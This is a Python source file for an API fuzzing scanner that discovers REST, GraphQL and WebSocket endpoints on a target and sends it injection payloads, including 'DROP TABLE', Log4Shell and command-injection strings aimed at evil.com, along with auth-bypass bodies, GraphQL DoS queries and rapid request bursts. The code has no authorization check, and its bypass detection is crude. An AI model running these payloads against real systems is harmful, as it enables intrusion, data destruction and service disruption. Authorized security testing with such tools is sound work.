
import requests
import json
import asyncio
import websockets
import time
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any, Optional
import re
import concurrent.futures
from dataclasses import dataclass

@dataclass
class APIEndpoint:
    """Represents a discovered API endpoint"""
    url: str
    method: str
    parameters: List[str]
    headers: Dict[str, str]
    auth_required: bool
    rate_limited: bool
    endpoint_type: str  # REST, GraphQL, WebSocket

class APIFuzzingEngine:
    """Advanced API fuzzing engine with REST, GraphQL, and WebSocket support"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.discovered_endpoints = []
        self.vulnerabilities_found = []
        
        # API testing payloads
        self.injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "%00",
            "1; ping -c 1 evil.com"
        ]
        
        self.auth_bypass_payloads = [
            {"admin": True},
            {"role": "admin"},
            {"isAdmin": "true"},
            {"privileges": "admin"},
            {"auth": "bypass"},
            {"user_id": 0},
            {"user_id": -1}
        ]

    def discover_api_endpoints(self) -> List[APIEndpoint]:
        """Discover API endpoints through various methods"""
        print("🔍 Discovering API endpoints...")
        
        # Method 1: Common API paths
        self._discover_common_paths()
        
        # Method 2: Documentation analysis
        self._discover_from_documentation()
        
        # Method 3: JavaScript analysis
        self._discover_from_javascript()
        
        # Method 4: Subdomain enumeration
        self._discover_api_subdomains()
        
        # Method 5: GraphQL introspection
        self._discover_graphql_endpoints()
        
        # Method 6: WebSocket endpoints
        self._discover_websocket_endpoints()
        
        print(f"✅ Discovered {len(self.discovered_endpoints)} API endpoints")
        return self.discovered_endpoints

    def _discover_common_paths(self):
        """Discover APIs from common paths"""
        common_paths = [
            '/api/v1/', '/api/v2/', '/api/v3/',
            '/rest/', '/restapi/', '/api/',
            '/graphql', '/graphql/', '/api/graphql',
            '/swagger/', '/swagger.json', '/swagger.yaml',
            '/openapi.json', '/api-docs/',
            '/v1/', '/v2/', '/v3/',
            '/json/', '/xml/', '/rpc/',
            '/services/', '/service/',
            '/data/', '/feed/', '/feeds/'
        ]
        
        for path in common_paths:
            try:
                url = self.base_url + path
                response = self.session.get(url, timeout=5)
                
                if response.status_code in [200, 201, 202, 400, 401, 403]:
                    endpoint_type = self._detect_endpoint_type(url, response)
                    endpoint = APIEndpoint(
                        url=url,
                        method='GET',
                        parameters=[],
                        headers=dict(response.headers),
                        auth_required=response.status_code == 401,
                        rate_limited=response.status_code == 429,
                        endpoint_type=endpoint_type
                    )
                    self.discovered_endpoints.append(endpoint)
                    
            except Exception:
                continue

    def _discover_from_documentation(self):
        """Discover APIs from documentation files"""
        doc_paths = [
            '/swagger.json', '/swagger.yaml',
            '/openapi.json', '/openapi.yaml',
            '/api-docs.json', '/docs.json',
            '/redoc/', '/rapidoc/'
        ]
        
        for path in doc_paths:
            try:
                url = self.base_url + path
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    self._parse_api_documentation(response.text, url)
                    
            except Exception:
                continue

    def _parse_api_documentation(self, content: str, doc_url: str):
        """Parse API documentation to extract endpoints"""
        try:
            if 'swagger' in doc_url or 'openapi' in doc_url:
                # Parse OpenAPI/Swagger documentation
                try:
                    doc = json.loads(content)
                    base_path = doc.get('basePath', '')
                    
                    for path, methods in doc.get('paths', {}).items():
                        for method, details in methods.items():
                            if isinstance(details, dict):
                                full_url = self.base_url + base_path + path
                                
                                # Extract parameters
                                parameters = []
                                if 'parameters' in details:
                                    parameters = [p.get('name', '') for p in details['parameters']]
                                
                                endpoint = APIEndpoint(
                                    url=full_url,
                                    method=method.upper(),
                                    parameters=parameters,
                                    headers={},
                                    auth_required='security' in details,
                                    rate_limited=False,
                                    endpoint_type='REST'
                                )
                                self.discovered_endpoints.append(endpoint)
                                
                except json.JSONDecodeError:
                    pass
                    
        except Exception:
            pass

    def _discover_from_javascript(self):
        """Discover API endpoints from JavaScript files"""
        try:
            # Get main page
            response = self.session.get(self.base_url, timeout=10)
            
            # Extract JavaScript file URLs
            js_pattern = r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\'][^>]*>'
            js_urls = re.findall(js_pattern, response.text, re.IGNORECASE)
            
            # Also look for inline API calls
            api_patterns = [
                r'["\']([^"\']*\/api\/[^"\']*)["\']',
                r'["\']([^"\']*\/rest\/[^"\']*)["\']',
                r'["\']([^"\']*\/graphql[^"\']*)["\']',
                r'["\']([^"\']*\/v\d+\/[^"\']*)["\']'
            ]
            
            for pattern in api_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    if self._is_valid_api_path(match):
                        full_url = urljoin(self.base_url, match)
                        endpoint = APIEndpoint(
                            url=full_url,
                            method='GET',
                            parameters=[],
                            headers={},
                            auth_required=False,
                            rate_limited=False,
                            endpoint_type='REST'
                        )
                        self.discovered_endpoints.append(endpoint)
            
            # Analyze JavaScript files
            for js_url in js_urls[:10]:  # Limit to first 10 JS files
                try:
                    full_js_url = urljoin(self.base_url, js_url)
                    js_response = self.session.get(full_js_url, timeout=5)
                    
                    for pattern in api_patterns:
                        matches = re.findall(pattern, js_response.text, re.IGNORECASE)
                        for match in matches:
                            if self._is_valid_api_path(match):
                                full_url = urljoin(self.base_url, match)
                                endpoint = APIEndpoint(
                                    url=full_url,
                                    method='GET',
                                    parameters=[],
                                    headers={},
                                    auth_required=False,
                                    rate_limited=False,
                                    endpoint_type='REST'
                                )
                                self.discovered_endpoints.append(endpoint)
                                
                except Exception:
                    continue
                    
        except Exception:
            pass

    def _discover_api_subdomains(self):
        """Discover API-specific subdomains"""
        api_subdomains = [
            'api', 'rest', 'ws', 'gateway', 'service',
            'dev-api', 'stage-api', 'test-api', 'v1', 'v2'
        ]
        
        parsed_url = urlparse(self.base_url)
        base_domain = parsed_url.netloc
        
        for subdomain in api_subdomains:
            try:
                api_domain = f"{subdomain}.{base_domain}"
                api_url = f"{parsed_url.scheme}://{api_domain}"
                
                response = self.session.get(api_url, timeout=5)
                if response.status_code in [200, 401, 403]:
                    endpoint = APIEndpoint(
                        url=api_url,
                        method='GET',
                        parameters=[],
                        headers=dict(response.headers),
                        auth_required=response.status_code == 401,
                        rate_limited=False,
                        endpoint_type='REST'
                    )
                    self.discovered_endpoints.append(endpoint)
                    
            except Exception:
                continue

    def _discover_graphql_endpoints(self):
        """Discover GraphQL endpoints"""
        graphql_paths = [
            '/graphql', '/graphql/', '/api/graphql',
            '/v1/graphql', '/query', '/gql'
        ]
        
        for path in graphql_paths:
            try:
                url = self.base_url + path
                
                # Try GraphQL introspection query
                introspection_query = {
                    "query": "query IntrospectionQuery { __schema { queryType { name } } }"
                }
                
                response = self.session.post(
                    url,
                    json=introspection_query,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                
                if response.status_code == 200 and 'data' in response.text:
                    endpoint = APIEndpoint(
                        url=url,
                        method='POST',
                        parameters=['query', 'variables'],
                        headers={'Content-Type': 'application/json'},
                        auth_required=False,
                        rate_limited=False,
                        endpoint_type='GraphQL'
                    )
                    self.discovered_endpoints.append(endpoint)
                    
            except Exception:
                continue

    def _discover_websocket_endpoints(self):
        """Discover WebSocket endpoints"""
        ws_paths = [
            '/ws', '/websocket', '/socket.io',
            '/api/ws', '/live', '/realtime',
            '/stream', '/events'
        ]
        
        for path in ws_paths:
            try:
                # Convert HTTP to WebSocket URL
                ws_url = self.base_url.replace('http://', 'ws://').replace('https://', 'wss://') + path
                
                # Basic connectivity test
                endpoint = APIEndpoint(
                    url=ws_url,
                    method='CONNECT',
                    parameters=[],
                    headers={},
                    auth_required=False,
                    rate_limited=False,
                    endpoint_type='WebSocket'
                )
                self.discovered_endpoints.append(endpoint)
                
            except Exception:
                continue

    def _detect_endpoint_type(self, url: str, response: requests.Response) -> str:
        """Detect the type of API endpoint"""
        content_type = response.headers.get('content-type', '').lower()
        
        if 'graphql' in url.lower():
            return 'GraphQL'
        elif 'ws' in url.lower() or 'websocket' in url.lower():
            return 'WebSocket'
        elif any(keyword in url.lower() for keyword in ['rest', 'api']):
            return 'REST'
        elif 'application/json' in content_type:
            return 'REST'
        else:
            return 'Unknown'

    def _is_valid_api_path(self, path: str) -> bool:
        """Check if path looks like a valid API endpoint"""
        api_indicators = [
            '/api/', '/rest/', '/v1/', '/v2/', '/v3/',
            '/graphql', '/json', '/xml'
        ]
        
        return any(indicator in path.lower() for indicator in api_indicators)

    def fuzz_discovered_endpoints(self, aggressive: bool = False) -> Dict[str, Any]:
        """Fuzz all discovered endpoints"""
        print(f"🎯 Fuzzing {len(self.discovered_endpoints)} discovered endpoints...")
        
        results = {
            'total_endpoints': len(self.discovered_endpoints),
            'vulnerabilities_found': 0,
            'authentication_bypasses': 0,
            'injection_vulnerabilities': 0,
            'detailed_results': []
        }
        
        # Use threading for faster testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            
            for endpoint in self.discovered_endpoints:
                if endpoint.endpoint_type == 'REST':
                    future = executor.submit(self._fuzz_rest_endpoint, endpoint, aggressive)
                elif endpoint.endpoint_type == 'GraphQL':
                    future = executor.submit(self._fuzz_graphql_endpoint, endpoint, aggressive)
                elif endpoint.endpoint_type == 'WebSocket':
                    future = executor.submit(self._fuzz_websocket_endpoint, endpoint, aggressive)
                else:
                    future = executor.submit(self._fuzz_generic_endpoint, endpoint, aggressive)
                
                futures.append(future)
            
            # Collect results
            for future in concurrent.futures.as_completed(futures):
                try:
                    endpoint_result = future.result(timeout=30)
                    results['detailed_results'].append(endpoint_result)
                    results['vulnerabilities_found'] += len(endpoint_result.get('vulnerabilities', []))
                    
                    # Count specific vulnerability types
                    for vuln in endpoint_result.get('vulnerabilities', []):
                        if 'authentication' in vuln.get('type', '').lower():
                            results['authentication_bypasses'] += 1
                        elif 'injection' in vuln.get('type', '').lower():
                            results['injection_vulnerabilities'] += 1
                            
                except Exception as e:
                    print(f"❌ Endpoint fuzzing failed: {e}")
        
        print(f"✅ API fuzzing complete - Found {results['vulnerabilities_found']} vulnerabilities")
        return results

    def _fuzz_rest_endpoint(self, endpoint: APIEndpoint, aggressive: bool) -> Dict[str, Any]:
        """Fuzz REST API endpoint"""
        result = {
            'endpoint': endpoint.url,
            'method': endpoint.method,
            'type': 'REST',
            'vulnerabilities': [],
            'response_codes': [],
            'interesting_responses': []
        }
        
        # Test injection vulnerabilities
        for payload in self.injection_payloads:
            try:
                # Test in URL parameters
                test_url = f"{endpoint.url}?test={payload}"
                response = self.session.get(test_url, timeout=5)
                
                result['response_codes'].append(response.status_code)
                
                if self._detect_injection_success(response, payload):
                    result['vulnerabilities'].append({
                        'type': 'Injection Vulnerability',
                        'payload': payload,
                        'endpoint': test_url,
                        'evidence': 'Injection pattern detected in response'
                    })
                
                # Test in POST body
                if endpoint.method in ['POST', 'PUT', 'PATCH']:
                    test_data = {'param': payload}
                    response = self.session.request(
                        endpoint.method,
                        endpoint.url,
                        json=test_data,
                        timeout=5
                    )
                    
                    if self._detect_injection_success(response, payload):
                        result['vulnerabilities'].append({
                            'type': 'JSON Injection Vulnerability',
                            'payload': payload,
                            'endpoint': endpoint.url,
                            'method': endpoint.method,
                            'evidence': 'Injection pattern detected in JSON response'
                        })
                        
            except Exception:
                continue
        
        # Test authentication bypass
        for auth_payload in self.auth_bypass_payloads:
            try:
                response = self.session.request(
                    endpoint.method,
                    endpoint.url,
                    json=auth_payload,
                    timeout=5
                )
                
                if self._detect_auth_bypass(response, auth_payload):
                    result['vulnerabilities'].append({
                        'type': 'Authentication Bypass',
                        'payload': str(auth_payload),
                        'endpoint': endpoint.url,
                        'method': endpoint.method,
                        'evidence': 'Unauthorized access achieved'
                    })
                    
            except Exception:
                continue
        
        # Test rate limiting
        if aggressive:
            rate_limit_result = self._test_rate_limiting(endpoint)
            if rate_limit_result:
                result['vulnerabilities'].append(rate_limit_result)
        
        return result

    def _fuzz_graphql_endpoint(self, endpoint: APIEndpoint, aggressive: bool) -> Dict[str, Any]:
        """Fuzz GraphQL endpoint"""
        result = {
            'endpoint': endpoint.url,
            'method': endpoint.method,
            'type': 'GraphQL',
            'vulnerabilities': [],
            'schema_exposed': False,
            'queries_tested': 0
        }
        
        # Test introspection
        introspection_query = {
            "query": """
            query IntrospectionQuery {
                __schema {
                    queryType { name fields { name } }
                    mutationType { name fields { name } }
                    types { name kind fields { name type { name kind } } }
                }
            }
            """
        }
        
        try:
            response = self.session.post(
                endpoint.url,
                json=introspection_query,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if response.status_code == 200 and '__schema' in response.text:
                result['schema_exposed'] = True
                result['vulnerabilities'].append({
                    'type': 'GraphQL Introspection Enabled',
                    'endpoint': endpoint.url,
                    'evidence': 'Full schema accessible via introspection',
                    'risk': 'Information disclosure'
                })
                
                # Extract schema information for further testing
                try:
                    schema_data = response.json()
                    queries = self._extract_graphql_queries(schema_data)
                    
                    # Test extracted queries with injection payloads
                    for query in queries[:5]:  # Limit to first 5
                        for payload in self.injection_payloads[:3]:  # Limit payloads
                            injection_query = self._create_injection_query(query, payload)
                            
                            test_response = self.session.post(
                                endpoint.url,
                                json={"query": injection_query},
                                headers={'Content-Type': 'application/json'},
                                timeout=5
                            )
                            
                            result['queries_tested'] += 1
                            
                            if self._detect_graphql_injection(test_response, payload):
                                result['vulnerabilities'].append({
                                    'type': 'GraphQL Injection',
                                    'query': query,
                                    'payload': payload,
                                    'endpoint': endpoint.url,
                                    'evidence': 'Injection successful in GraphQL query'
                                })
                                
                except Exception:
                    pass
                    
        except Exception:
            pass
        
        # Test depth-based DoS
        if aggressive:
            dos_result = self._test_graphql_dos(endpoint)
            if dos_result:
                result['vulnerabilities'].append(dos_result)
        
        return result

    def _fuzz_websocket_endpoint(self, endpoint: APIEndpoint, aggressive: bool) -> Dict[str, Any]:
        """Fuzz WebSocket endpoint"""
        result = {
            'endpoint': endpoint.url,
            'method': endpoint.method,
            'type': 'WebSocket',
            'vulnerabilities': [],
            'connection_successful': False,
            'messages_tested': 0
        }
        
        try:
            # Test WebSocket connection
            asyncio.run(self._test_websocket_connection(endpoint, result))
        except Exception as e:
            result['connection_error'] = str(e)
        
        return result

    async def _test_websocket_connection(self, endpoint: APIEndpoint, result: Dict):
        """Test WebSocket connection and message injection"""
        try:
            uri = endpoint.url
            
            async with websockets.connect(uri, timeout=10) as websocket:
                result['connection_successful'] = True
                
                # Test message injection
                test_messages = [
                    '{"type": "auth", "token": "admin"}',
                    '{"action": "admin", "data": "test"}',
                    '{"cmd": "' + self.injection_payloads[0] + '"}',
                    '{"query": "' + self.injection_payloads[1] + '"}'
                ]
                
                for message in test_messages:
                    try:
                        await websocket.send(message)
                        response = await asyncio.wait_for(websocket.recv(), timeout=5)
                        
                        result['messages_tested'] += 1
                        
                        if self._detect_websocket_injection(response, message):
                            result['vulnerabilities'].append({
                                'type': 'WebSocket Injection',
                                'message': message,
                                'endpoint': endpoint.url,
                                'evidence': 'Injection detected in WebSocket response'
                            })
                            
                    except asyncio.TimeoutError:
                        continue
                    except Exception:
                        continue
                        
        except Exception as e:
            result['connection_error'] = str(e)

    def _fuzz_generic_endpoint(self, endpoint: APIEndpoint, aggressive: bool) -> Dict[str, Any]:
        """Fuzz generic/unknown endpoint type"""
        result = {
            'endpoint': endpoint.url,
            'method': endpoint.method,
            'type': 'Generic',
            'vulnerabilities': [],
            'response_analysis': {}
        }
        
        # Basic fuzzing similar to REST
        for payload in self.injection_payloads[:3]:  # Limited payloads for unknown types
            try:
                test_url = f"{endpoint.url}?test={payload}"
                response = self.session.get(test_url, timeout=5)
                
                if self._detect_injection_success(response, payload):
                    result['vulnerabilities'].append({
                        'type': 'Potential Injection',
                        'payload': payload,
                        'endpoint': test_url,
                        'evidence': 'Suspicious response pattern'
                    })
                    
            except Exception:
                continue
        
        return result

    def _detect_injection_success(self, response: requests.Response, payload: str) -> bool:
        """Detect if injection was successful"""
        response_text = response.text.lower()
        
        # SQL injection indicators
        if "'" in payload and any(indicator in response_text for indicator in [
            'sql syntax', 'mysql', 'postgresql', 'oracle error',
            'sqlite', 'database error', 'warning:', 'fatal error'
        ]):
            return True
        
        # XSS indicators
        if '<script>' in payload and payload.lower() in response_text:
            return True
        
        # File inclusion indicators
        if '../' in payload and any(indicator in response_text for indicator in [
            'root:x:', '/bin/bash', 'daemon:', '[boot loader]'
        ]):
            return True
        
        # Command injection indicators
        if any(cmd in payload for cmd in ['ping', 'whoami', 'id']) and any(indicator in response_text for indicator in [
            'uid=', 'gid=', 'ping statistics', 'packets transmitted'
        ]):
            return True
        
        return False

    def _detect_auth_bypass(self, response: requests.Response, payload: Dict) -> bool:
        """Detect authentication bypass success"""
        # Check for successful authentication indicators
        success_indicators = [
            'welcome', 'dashboard', 'admin panel', 'logout',
            'profile', 'settings', 'authenticated', 'token'
        ]
        
        response_text = response.text.lower()
        
        # Successful response with auth indicators
        if response.status_code == 200 and any(indicator in response_text for indicator in success_indicators):
            return True
        
        # Check for admin/privileged access
        if 'admin' in str(payload) and any(indicator in response_text for indicator in [
            'admin', 'administrator', 'privileged', 'elevated'
        ]):
            return True
        
        return False

    def _detect_graphql_injection(self, response: requests.Response, payload: str) -> bool:
        """Detect GraphQL injection success"""
        if response.status_code != 200:
            return False
        
        try:
            data = response.json()
            
            # Check for errors that indicate injection
            if 'errors' in data:
                error_text = str(data['errors']).lower()
                if any(indicator in error_text for indicator in [
                    'syntax error', 'parse error', 'sql', 'database'
                ]):
                    return True
            
            # Check for unexpected data in response
            if 'data' in data and payload.lower() in str(data['data']).lower():
                return True
                
        except Exception:
            pass
        
        return False

    def _detect_websocket_injection(self, response: str, message: str) -> bool:
        """Detect WebSocket injection success"""
        response_lower = response.lower()
        
        # Check for error messages indicating injection
        error_indicators = [
            'error', 'exception', 'syntax', 'parse',
            'sql', 'database', 'unauthorized', 'admin'
        ]
        
        # Check if injection payload appears in response
        if any(payload in message for payload in self.injection_payloads):
            if any(indicator in response_lower for indicator in error_indicators):
                return True
        
        return False

    def _extract_graphql_queries(self, schema_data: Dict) -> List[str]:
        """Extract available queries from GraphQL schema"""
        queries = []
        
        try:
            query_type = schema_data.get('data', {}).get('__schema', {}).get('queryType', {})
            fields = query_type.get('fields', [])
            
            for field in fields:
                query_name = field.get('name', '')
                if query_name:
                    queries.append(f"query {{ {query_name} }}")
                    
        except Exception:
            pass
        
        return queries

    def _create_injection_query(self, base_query: str, payload: str) -> str:
        """Create injection query from base query and payload"""
        # Simple injection by adding payload as parameter
        if '{' in base_query and '}' in base_query:
            # Insert payload as a parameter
            query_parts = base_query.split('{', 1)
            if len(query_parts) == 2:
                return f"{query_parts[0]}{{ {query_parts[1][:-1]}(input: \"{payload}\") }}"
        
        return base_query

    def _test_rate_limiting(self, endpoint: APIEndpoint) -> Optional[Dict[str, Any]]:
        """Test for rate limiting vulnerabilities"""
        try:
            # Send rapid requests
            responses = []
            for i in range(10):
                response = self.session.get(endpoint.url, timeout=2)
                responses.append(response.status_code)
                time.sleep(0.1)  # Small delay
            
            # Check if rate limiting is not implemented
            success_responses = len([r for r in responses if r == 200])
            
            if success_responses >= 8:  # Most requests succeeded
                return {
                    'type': 'Rate Limiting Bypass',
                    'endpoint': endpoint.url,
                    'evidence': f'{success_responses}/10 requests succeeded',
                    'risk': 'DoS and resource exhaustion possible'
                }
                
        except Exception:
            pass
        
        return None

    def _test_graphql_dos(self, endpoint: APIEndpoint) -> Optional[Dict[str, Any]]:
        """Test GraphQL depth-based DoS"""
        try:
            # Create deeply nested query
            deep_query = {
                "query": """
                query {
                    user {
                        posts {
                            comments {
                                author {
                                    posts {
                                        comments {
                                            author {
                                                name
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                """
            }
            
            start_time = time.time()
            response = self.session.post(
                endpoint.url,
                json=deep_query,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            execution_time = time.time() - start_time
            
            # If query takes too long or causes server error
            if execution_time > 5 or response.status_code == 500:
                return {
                    'type': 'GraphQL Depth-based DoS',
                    'endpoint': endpoint.url,
                    'evidence': f'Query execution time: {execution_time:.2f}s',
                    'risk': 'Server resource exhaustion'
                }
                
        except Exception:
            pass
        
        return None

    def generate_api_security_report(self, results: Dict[str, Any]) -> str:
        """Generate comprehensive API security report"""
        
        report = f"""
═══════════════════════════════════════
        API SECURITY ASSESSMENT
═══════════════════════════════════════

🎯 **Target:** {self.base_url}
📡 **Endpoints Discovered:** {results['total_endpoints']}
🔍 **Vulnerabilities Found:** {results['vulnerabilities_found']}

📊 **Vulnerability Breakdown:**
🔓 Authentication Bypasses: {results['authentication_bypasses']}
💉 Injection Vulnerabilities: {results['injection_vulnerabilities']}
⚡ Rate Limiting Issues: {len([r for r in results['detailed_results'] if any('Rate Limiting' in v.get('type', '') for v in r.get('vulnerabilities', []))])}

🔍 **Endpoint Analysis:**
"""
        
        # Group by endpoint type
        endpoint_types = {}
        for result in results['detailed_results']:
            endpoint_type = result.get('type', 'Unknown')
            if endpoint_type not in endpoint_types:
                endpoint_types[endpoint_type] = 0
            endpoint_types[endpoint_type] += 1
        
        for endpoint_type, count in endpoint_types.items():
            report += f"📡 {endpoint_type}: {count} endpoints\n"
        
        # Top vulnerabilities
        if results['vulnerabilities_found'] > 0:
            report += "\n🚨 **Critical Findings:**\n"
            
            vuln_count = 0
            for result in results['detailed_results']:
                for vuln in result.get('vulnerabilities', []):
                    if vuln_count >= 5:  # Limit to top 5
                        break
                    vuln_count += 1
                    
                    report += f"\n{vuln_count}. **{vuln.get('type', 'Unknown')}**\n"
                    report += f"   Endpoint: {vuln.get('endpoint', 'N/A')}\n"
                    report += f"   Evidence: {vuln.get('evidence', 'N/A')}\n"
                    if 'payload' in vuln:
                        report += f"   Payload: {vuln['payload'][:50]}...\n"
        
        report += "\n═══════════════════════════════════════\n"
        return report
